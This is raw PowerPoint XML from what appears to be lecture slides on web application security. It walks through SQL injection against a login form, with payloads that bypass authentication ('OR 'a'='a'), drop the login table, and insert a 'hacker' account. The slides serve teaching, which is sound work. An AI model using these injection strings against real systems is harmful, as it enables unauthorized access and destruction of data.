              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="104000"/>
                  </a:lnSpc>
                  <a:buClr>
                    <a:srgbClr val="000000"/>
                  </a:buClr>
                  <a:buSzPct val="100000"/>
                  <a:buFont typeface="굴림"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solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Trebuchet MS" charset="0"/>
                  </a:rPr>
                  <a:t>Database</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="10" name="Text Box 9"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3557" y="2833"/>
                <a:ext cx="337" cy="33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1pPr>
                <a:lvl2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2pPr>
                <a:lvl3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3pPr>
                <a:lvl4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4pPr>
                <a:lvl5pPr>
                  <a:lnSpc>
                    <a:spcPct val="96000"/>
                  </a:lnSpc>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5pPr>
                <a:lvl6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6pPr>
                <a:lvl7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7pPr>
                <a:lvl8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8pPr>
                <a:lvl9pPr fontAlgn="base">
                  <a:lnSpc>
                    <a:spcPct val="96000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPct val="0"/>
                  </a:spcBef>
                  <a:spcAft>
                    <a:spcPct val="0"/>
                  </a:spcAft>
                  <a:buClr>
                    <a:srgbClr val="000000"/>
                  </a:buClr>
                  <a:buSzPct val="100000"/>
                  <a:buFont typeface="굴림"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굴림" charset="0"/>
                    <a:ea typeface="굴림" charset="0"/>
                    <a:cs typeface="굴림" charset="0"/>
                  </a:defRPr>
                </a:lvl9pPr>
              </a:lstStyle>
              <a:p>
                <a:pPr>
                  <a:lnSpc>
                    <a:spcPct val="104000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="1750"/>
                  </a:spcBef>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-GB" sz="2800" b="1">
                    <a:latin typeface="Trebuchet MS" charset="0"/>
                    <a:ea typeface="宋体" charset="0"/>
                    <a:cs typeface="宋体" charset="0"/>
                  </a:rPr>
                  <a:t>b</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="12" name="Straight Arrow Connector 11"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="1471879" y="2460956"/>
              <a:ext cx="1069975" cy="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13" name="Lightning Bolt 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1827279" y="2027872"/>
            <a:ext cx="451296" cy="1079564"/>
          </a:xfrm>
          <a:prstGeom prst="lightningBol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1451486" y="6211993"/>
            <a:ext cx="6963033" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2262421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Picture 3.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2381" y="1194544"/>
            <a:ext cx="3092740" cy="1737194"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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2779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="113622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Picture 3.pn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0" y="1181658"/>
            <a:ext cx="3846264" cy="2160449"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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22779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="298322" y="2031706"/>
            <a:ext cx="738904"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>David14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="196676" y="2361178"/>
            <a:ext cx="838466"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>CEG6400</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1301197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Picture 3.pn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0" y="1181658"/>
            <a:ext cx="3846264" cy="2160449"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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22779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="169607" y="2031706"/>
            <a:ext cx="997389"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’ OR ‘a’ = ‘a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="170933" y="2361178"/>
            <a:ext cx="227872"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{157BF2DC-C2E3-E244-B25E-3C3CAD4777FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237435" y="5567572"/>
            <a:ext cx="9647583" cy="3693319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" u="sng">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>TRUE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND  `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE TRUE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="197884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Picture 3.pn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0" y="1181658"/>
            <a:ext cx="3846264" cy="2160449"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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22779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="99534" y="1754707"/>
            <a:ext cx="1992853"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ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; DROP TABLE `login`; -- </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="170933" y="2361178"/>
            <a:ext cx="530915"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>XXX</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1199624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Picture 3.pn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0" y="1181658"/>
            <a:ext cx="3846264" cy="2160449"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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22779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="99534" y="1754707"/>
            <a:ext cx="4596130"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ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; INSERT INTO `login` ('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>user','pass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>') VALUES (’hacker',’12345');</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 6"/>
